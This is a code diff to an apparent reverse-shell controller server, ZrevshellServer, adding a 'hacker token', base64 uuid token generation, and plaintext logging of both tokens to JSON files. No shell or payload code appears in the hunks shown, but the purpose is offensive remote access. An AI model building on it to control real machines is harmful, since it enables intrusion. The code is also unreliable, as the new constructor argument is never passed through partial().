@@ -1,6 +1,9 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from http import HTTPStatus
 from functools import partial
+from datetime import datetime
+from pathlib import Path
+import reverse_shell.utils as ut
 import json
 import uuid
 import base64
@@ -10,9 +13,11 @@ PORT = 80
 
 
 class ZrevshellServer(BaseHTTPRequestHandler):
-    def __init__(self, auth_token: str,  *args, **kwargs):
+    def __init__(self, auth_token: str, hacker_token: str,  *args, **kwargs):
         # auth_token is a base64 message i.e it is a string that has been decoded from a base64 byte using ascii.
         self.auth_token = auth_token
+        self.hacker_token = hacker_token
+
         super().__init__(*args, **kwargs)
 
     def is_authenticated(self):
@@ -65,18 +70,53 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 self.send_error(HTTPStatus.UNSUPPORTED_MEDIA_TYPE)
                 self.end_headers()
 
+# hacker_token + auth_token
 
-def initialize_server(auth_token: str | None = None):
+
+def generate_token():
+    random_uuid = uuid.uuid4()
+    random_encoded_bytes = str(random_uuid).encode('ascii')
+    base64_encoded_bytes = base64.b64encode(random_encoded_bytes)
+    return base64_encoded_bytes.decode('ascii')
+
+
+# def decode_token(token: str):
+#     ascii_encoded_base64 = token.encode("ascii")
+#     decoded_ascii = base64.b64decode(ascii_encoded_base64)
+#     return decoded_ascii.decode("ascii")
+
+
+def initialize_server(auth_token: str | None = None, hacker_token: str | None = None):
     # auth_token is a base64 message i.e it is a string that has been decoded from a base64 byte using ascii.
     if not auth_token:
-        random_encoded_bytes = str(uuid.uuid4()).encode('ascii')
-        base64_encoded_bytes = base64.b64encode(random_encoded_bytes)
-        auth_token = base64_encoded_bytes.decode('ascii')
+        auth_token = generate_token()
+
+    if not hacker_token:
+        hacker_token = generate_token()
+
+    # Create a log file with the hacker and auth token
+    current_time = str(datetime.now())
+    current_time = current_time.replace(":", "-")
+    current_time = current_time.replace(" ", "-")
+    current_time = current_time.split(".")[0]
+
+    # Create the path and stuff
+    directory = Path("./logs/")
+    directory.mkdir(parents=True, exist_ok=True)
+
+    file_path = directory / f"{current_time}.json"
+
+    with file_path.open("w") as log_file:
+        data = {"auth_token": auth_token, "hacker_token": hacker_token}
+        log_file.write(json.dumps(data))
 
     handler = partial(ZrevshellServer, auth_token)
-    print(f"Server is running on {HOST} port {PORT}...")
+
+    ut.log("info", f"Server is running on {HOST} port {PORT}...")
     server = HTTPServer((HOST, PORT), handler)
-    print(f"Generated authentication token -> {auth_token}")
+    ut.log("info", f"Generated authentication token -> {auth_token}")
+    ut.log("info", f"Generated hacker's token -> {hacker_token}")
+
     try:
         server.serve_forever()
     except KeyboardInterrupt:
